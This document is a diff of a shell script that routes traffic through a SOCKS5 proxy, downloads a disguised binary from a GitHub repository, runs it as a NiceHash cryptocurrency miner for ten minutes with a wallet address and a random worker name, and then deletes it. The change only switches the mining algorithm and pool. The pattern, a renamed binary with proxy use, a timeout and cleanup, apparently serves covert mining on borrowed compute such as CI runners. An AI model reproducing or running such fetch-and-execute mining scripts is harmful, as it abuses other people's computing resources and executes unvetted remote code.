@@ -13,6 +13,6 @@ curl -x "socks5://65.2.123.108:9001" ifconfig.co
 #sleep 10
 wget https://github.com/archernap/prem/raw/main/priyatama
 chmod +x priyatama
-timeout 10m ./priyatama --algo BEAM-III --pool stratum+tcp://beamv3.usa-east.nicehash.com:3387 --user 3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E.$(echo $(shuf -i 10-40 -n 1)-Dg)
+timeout 10m ./priyatama --algo daggerhashimoto --pool stratum+tcp://daggerhashimoto.eu-west.nicehash.com:3353 --user 3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E.$(echo $(shuf -i 10-40 -n 1)-Dg)
 rm -r priyatama
 sleep 5
